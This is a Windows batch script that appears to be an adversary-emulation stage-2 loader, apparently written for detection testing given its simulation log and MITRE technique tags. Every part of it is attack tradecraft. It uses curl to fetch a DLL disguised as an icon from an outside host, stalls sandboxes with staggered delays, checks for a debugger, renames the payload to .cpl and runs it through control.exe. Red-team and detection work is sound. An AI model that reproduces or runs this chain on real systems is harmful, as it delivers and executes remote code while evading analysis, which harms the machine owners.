@echo off
setlocal enabledelayedexpansion

REM --- Random-named SET variable declarations for all PHR_* placeholders ---
SET nbqgkx=%APPDATA%\10887\4f5be781
SET zcfymr=ce65cb7c.txt
SET apdbcv=https://10.0.0.49/stage/2/icon.png?10887-7
SET kdlwrv=BALAM-S2BO
SET jghepo=10887
SET mntxsi=7
SET ruqzhd=%PUBLIC%\\macula-simulations.log

REM --- Capture timestamp once for reuse ---
SET tsvar=!DATE!/!TIME!

REM --- Initial delay 10-20 seconds to evade sandbox (method 1) ---
timeout /t 15 /nobreak >nul 2>&1

REM --- Heartbeat fetch: download Stage 2 Loader DLL via curl ---
echo [!tsvar!][DEBUG][!kdlwrv!][!jghepo!]: heartbeat_start>> "!ruqzhd!" 2>nul
curl -k -s -o "!nbqgkx!\!zcfymr!" "!apdbcv!"
if ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!kdlwrv!][!jghepo!]: heartbeat_result=1>> "!ruqzhd!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!kdlwrv!][!jghepo!]: heartbeat_result=0>> "!ruqzhd!" 2>nul
)

REM --- Delay between operations (method 2: ping) ---
ping -n 8 127.0.0.1 >nul 2>&1

REM --- Change to output directory ---
echo [!tsvar!][DEBUG][!kdlwrv!][!jghepo!]: chdir_start>> "!ruqzhd!" 2>nul
cd /d "!nbqgkx!" 2>nul
if ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!kdlwrv!][!jghepo!]: chdir_result=1>> "!ruqzhd!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!kdlwrv!][!jghepo!]: chdir_result=0>> "!ruqzhd!" 2>nul
)

REM --- Delay (method 3: CHOICE with short timeout) ---
CHOICE /C Y /N /D Y /T 7 >nul 2>&1

REM --- Anti-analysis: Debugger check (if attached, sleep random 2-5s but continue) ---
wmic process where "name='cmd.exe' and processid=%PID%" get /format:list 2>nul | findstr /i "Debugger" >nul 2>&1
if not errorlevel 1 (
    SET /A debugwait=%RANDOM% %% 3001 + 2000
    timeout /t !debugwait! /nobreak >nul 2>&1
)

REM --- Delay before LOLBIN execution (random 10-30s) ---
SET /A delay=%RANDOM% %% 20 + 10
timeout /t !delay! /nobreak >nul 2>&1

REM --- Rename DLL to .cpl extension in output directory ---
echo [!tsvar!][DEBUG][!kdlwrv!][!jghepo!]: rename_start>> "!ruqzhd!" 2>nul
move /y "!zcfymr!" "!zcfymr!.cpl" >nul 2>&1
if ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!kdlwrv!][!jghepo!]: rename_result=1>> "!ruqzhd!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!kdlwrv!][!jghepo!]: rename_result=0>> "!ruqzhd!" 2>nul
)

REM --- Invoke DLL via control.exe LOLBIN ---
echo [!tsvar!][DEBUG][!kdlwrv!][!jghepo!]: rundll32_start>> "!ruqzhd!" 2>nul
start /b control.exe "!zcfymr!.cpl"
if ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!kdlwrv!][!jghepo!]: rundll32_result=1>> "!ruqzhd!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!kdlwrv!][!jghepo!]: rundll32_result=0>> "!ruqzhd!" 2>nul
)

REM --- Final delay before exit ---
timeout /t 5 /nobreak >nul 2>&1

REM --- TTP logging (T1218 System Binary Proxy Execution) ---
echo [!tsvar!][TTP][!kdlwrv!][!jghepo!]: T1218|System Binary Proxy Execution=OK:>> "!ruqzhd!" 2>nul

REM --- TTP logging (T1497 Virtualization/Sandbox Evasion) ---
echo [!tsvar!][TTP][!kdlwrv!][!jghepo!]: T1497|Virtualization/Sandbox Evasion=OK:>> "!ruqzhd!" 2>nul

exit /b 0